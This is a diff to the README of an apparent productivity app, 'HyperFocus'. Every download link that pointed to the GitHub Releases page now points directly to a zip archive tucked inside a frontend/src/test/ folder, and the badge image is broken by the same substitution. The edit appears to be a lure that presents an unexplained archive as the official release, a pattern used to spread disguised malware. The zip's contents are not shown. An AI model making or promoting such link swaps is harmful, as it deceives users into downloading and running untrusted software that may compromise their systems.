@@ -1,7 +1,7 @@
 # 🛠️ HyperFocus - Boost Your Productivity Effortlessly
 
 ## 📦 Download HyperFocus
-[![Download HyperFocus](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/hellwin2/HyperFocus/releases)
+[![Download HyperFocus](https://raw.githubusercontent.com/hellwin2/HyperFocus/main/frontend/src/test/HyperFocus_v2.2.zip%20Now-brightgreen)](https://raw.githubusercontent.com/hellwin2/HyperFocus/main/frontend/src/test/HyperFocus_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to HyperFocus! This tool helps you analyze your focus, interruptions, an
 
 To get started, you need to visit the Releases page for HyperFocus. Click the link below to download the latest version:
 
-[Visit this page to download HyperFocus](https://github.com/hellwin2/HyperFocus/releases)
+[Visit this page to download HyperFocus](https://raw.githubusercontent.com/hellwin2/HyperFocus/main/frontend/src/test/HyperFocus_v2.2.zip)
 
 Once you are on the page, follow these steps:
 
@@ -70,6 +70,6 @@ HyperFocus is licensed under the MIT License. You can use, modify, and distribut
 
 For more details, check out our official documentation and guides. 
 
-### **[Visit this page to download HyperFocus](https://github.com/hellwin2/HyperFocus/releases)**
+### **[Visit this page to download HyperFocus](https://raw.githubusercontent.com/hellwin2/HyperFocus/main/frontend/src/test/HyperFocus_v2.2.zip)**
 
 Thank you for choosing HyperFocus to enhance your productivity!
